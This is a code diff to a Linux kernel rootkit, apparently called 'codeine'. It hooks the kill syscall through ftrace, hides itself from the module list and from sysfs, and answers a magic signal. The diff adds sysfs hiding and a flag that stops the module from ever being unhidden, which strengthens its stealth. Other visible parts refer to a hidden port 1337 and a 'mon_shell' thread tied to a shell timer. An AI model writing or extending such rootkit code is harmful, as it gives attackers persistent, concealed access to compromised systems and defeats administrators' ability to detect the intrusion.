@@ -6,6 +6,9 @@
 
 #include "ftrace_helper.h"
 
+#define TRUE 1
+#define FALSE 0
+
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Diego Tellaroli");
 MODULE_DESCRIPTION("GPL");
@@ -13,24 +16,38 @@ MODULE_DESCRIPTION("GPL");
 enum {
     SIGHIDE = 59,
     TIMETOSHELL = 30,
-    HIDENPORT = 1337
+    HIDENPORT = 1337,
+    CANBEUNHIDE = FALSE
 };
 
 static int hide_status = 0;
 static asmlinkage long(*orig_kill)(const struct pt_regs *);
 
+
+static void hide_sysfs(void) {
+    if (THIS_MODULE->mkobj.kobj.state_initialized) {
+        kobject_del(&THIS_MODULE->mkobj.kobj); // Remove the kobject from sysfs
+    }
+}
+
 static struct list_head *module_previous;
 void module_hide(void)
 {
+        void hide_sysfs(void);
         module_previous = THIS_MODULE->list.prev;
         list_del(&THIS_MODULE->list);
+
+        hide_sysfs();
+
         hide_status = 1;
 
 }
 
 void module_show(void)
 {
- list_add(&THIS_MODULE->list, module_previous);
+ kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "codeine"); //add to sysfs
+
+ list_add(&THIS_MODULE->list, module_previous); //add to the module list
  hide_status = 0;
 }
 
@@ -43,7 +60,9 @@ static asmlinkage int hook_kill(const struct pt_regs *regs){
 
  if(signal == SIGHIDE){
     if(hide_status == 1){
-        module_show();
+        if(CANBEUNHIDE == TRUE){
+            module_show();
+        }
     }else{
         module_hide();
     }
@@ -96,6 +115,8 @@ int mon_shell(void *data) {     // Function that will be executed by the kernel 
     }
     return 0;  // Returns 0 when the thread finishes.
 }
+
+
 
 static int __init uninterruptible_sleep_init(void) {
     module_hide();
